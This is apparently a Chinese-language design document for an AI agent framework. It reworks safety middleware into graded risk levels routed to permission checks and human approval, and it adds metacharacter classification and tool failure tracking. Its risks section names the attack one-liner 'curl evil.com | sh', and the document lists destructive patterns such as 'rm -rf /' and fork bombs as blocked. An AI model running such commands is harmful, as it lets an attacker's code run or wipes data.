## Context

open_agent 当前采用"安全层硬拦截 + 权限层门控"的 middleware chain 架构（SafetyMiddleware → PermissionMiddleware → TruncateMiddleware → ExecuteMiddleware）。安全层检测到风险后直接返回 `"Error: ..."` 字符串短路整个链路，不经过权限层和 HITL。这导致三类系统性问题：

1. **参数感知缺失**：SafetyMiddleware 检查 URL 时硬编码取 `params["url"]`，但 `web_search` 工具（DuckDuckGo/Brave）的参数是 `query`/`count`，URL 由库内部构建，导致 SSRF 检查收到空字符串报 "No hostname in URL"。
2. **元字符一刀切**：CommandSafetyChecker 将管道符 `|`、`&&` 与命令替换 `$()`、反引号同等对待，全部硬拦截。合法的 `curl | head`、`grep && echo` 均被阻止，agent 失去 shell 核心能力。
3. **安全-权限断层**：安全层硬拦截后不经过 PermissionMiddleware，HITL 无法介入，用户无法批准被误拦的操作。

参照 Claude Code 的设计路径：**安全检测产出风险等级 → 权限层根据风险等级决定放行/确认/拒绝 → HITL 展示安全上下文**。

## Goals / Non-Goals

**Goals:**
- 安全检查绑定到具体参数名，内部构建 URL 的工具跳过 URL 检查
- 安全层产出结构化风险结果（safe/risky/blocked），而非硬拦截字符串
- 元字符分级：低风险（`|`、`&&`）允许白名单命令使用，高风险（`$()`、反引号）仍硬拦截
- PermissionMiddleware 处理 `risky` 级别操作时触发 HITL 确认
- ReAct 循环追踪工具连续失败次数，超过阈值后提示 LLM 换用其他工具
- `_compose_final_answer` 在全步失败时返回结构化失败消息

**Non-Goals:**
- 不引入沙箱执行环境（那是 sandbox-execution-path 的职责）
- 不修改 recovery 策略的内部逻辑
- 不新增外部依赖
- 不改变 middleware chain 的总体执行顺序

## Decisions

### Decision 1: 安全检查参数绑定

**选择**：在 Tool 基类的 `safety_checks` 字段中支持映射语法，从 `["url"]` 升级为 `[{"type": "url", "param": "target_url"}]`。

**替代方案**：在 SafetyMiddleware 中硬编码每种工具的参数名映射表 → 不可扩展，每新增工具都要改中间件。

**理由**：参数绑定应声明在工具侧（工具知道自己哪个参数是 URL），而非中间件侧。向后兼容：纯字符串 `"url"` 等价于 `{"type": "url", "param": "url"}`。对于 DuckDuckGo/Brave 搜索工具，直接移除 `safety_checks` 中的 `"url"` 项，因为 URL 由库内部构建，不需要 SSRF 检查。

### Decision 2: SafetyMiddleware 输出结构化风险结果

**选择**：SafetyMiddleware 不再返回 `"Error: ..."` 字符串短路链路。改为在 `MiddlewareContext` 上附加 `safety_risks: list[SafetyRisk]`，然后继续调用 `next()`。下游 PermissionMiddleware 读取 `safety_risks` 并根据风险级别决策。

**替代方案 A**：SafetyMiddleware 直接调用 HITL → 违反单一职责，安全层不应直接依赖 HITL。
**替代方案 B**：SafetyMiddleware 返回自定义异常 → 改变了 middleware chain 的接口契约，影响面大。

**理由**：通过 `MiddlewareContext` 传递风险信息是最小侵入的方案。MiddlewareContext 已经是贯穿链路的数据载体，新增字段不影响已有中间件。`blocked` 级别（如 `rm -rf /`）仍然直接短路，不经过权限层——这是不可协商的安全底线。

风险级别定义：
- `safe`：无风险，正常执行
- `risky`：有安全顾虑但可由用户批准（如低风险元字符、非白名单命令使用管道）
- `blocked`：绝对不可执行（如 `rm -rf /`、fork bomb、SSRF 到云元数据端点）

### Decision 3: 元字符三级分类

**选择**：将 `_DANGEROUS_METACHAR_PATTERNS` 拆分为两个列表：
- `_LOW_RISK_METACHAR_PATTERNS`：`|`、`&&`、`||` — 产生 `risky` 结果，可由用户批准
- `_HIGH_RISK_METACHAR_PATTERNS`：`;`、`$(`、反引号、`>`、`<` — 产生 `blocked` 结果

**替代方案**：全部降级为 risky → 不合理，命令替换 `$()` 和输出重定向 `>` 存在真实的注入风险。

**理由**：管道和逻辑运算符是 shell 的基础组合能力，拦截它们等于废掉了 exec 工具 80% 的实用性。而命令替换和重定向确实可以用于注入攻击，保持硬拦截是合理的。

### Decision 4: 工具健康度追踪

**选择**：在 ReAct 循环中维护 `tool_failure_counts: dict[str, int]`，每次工具执行失败时递增，成功时重置为 0。当某工具连续失败次数 ≥ 3 时，在该步的 Observation content 中追加提示：`"[Tool '{name}' has failed consecutively. Consider using an alternative tool.]"`。

**替代方案 A**：直接将失败工具从 registry 移除 → 太激进，可能误杀可恢复的工具。
**替代方案 B**：在 LLM prompt 中注入工具可用性信息 → 需要修改 prompt 模板，侵入性大。

**理由**：通过 Observation 追加提示是最轻量的方案，LLM 能自然理解并调整策略，不需要改变 prompt 结构或 registry。

### Decision 5: 最终答案相关性守卫

**选择**：在 `_compose_final_answer` 开头增加一个前置检查：如果没有任何成功的步骤，或者所有成功步骤都是不相关的工具调用（检测成功的工具是否与用户意图相关），返回结构化失败消息。

**实现逻辑**：
1. 检查是否有 `success=True` 且 `tool_name` 为空（直接回答）的步骤 → 返回该回答
2. 检查是否有任何 `success=True` 的步骤 → 返回该内容
3. **新增**：如果没有成功步骤，或只有无关步骤成功 → 返回 `"未能完成任务。以下工具在执行过程中遇到问题：{tool_failures_summary}"`
4. 回退：`"Processed: {user_input}"`

### Decision 6: HITL 审批展示安全上下文

**选择**：当 PermissionMiddleware 因 `risky` 安全风险触发 HITL 时，在审批提示中附加安全风险信息：被触发的规则名称和建议的替代方案。

**理由**：用户需要知道为什么操作被标记为有风险，才能做出知情决策。

## Risks / Trade-offs

- **[向后兼容性]** `SafetyCheckResult` 新增 `risk_level` 字段 → 影响 CommandSafetyChecker 和 SSRFProtector 的返回值。**缓解**：`risk_level` 默认为 `None`（等价于当前的 `safe=False` 行为），已有代码无需修改。
- **[元字符分级误判]** 将 `|` 降级为低风险后，恶意命令可能通过 `curl evil.com | sh` 执行。**缓解**：黑名单模式仍检查管道后的命令是否匹配危险模式（如 `sh`、`bash`），且 HITL 确认提供了最终安全网。
- **[性能]** 工具健康度追踪是纯内存操作，无性能影响。
- **[过度提示]** 工具失败时追加的提示可能干扰 LLM 推理。**缓解**：只在实际失败时追加，且措辞简洁。
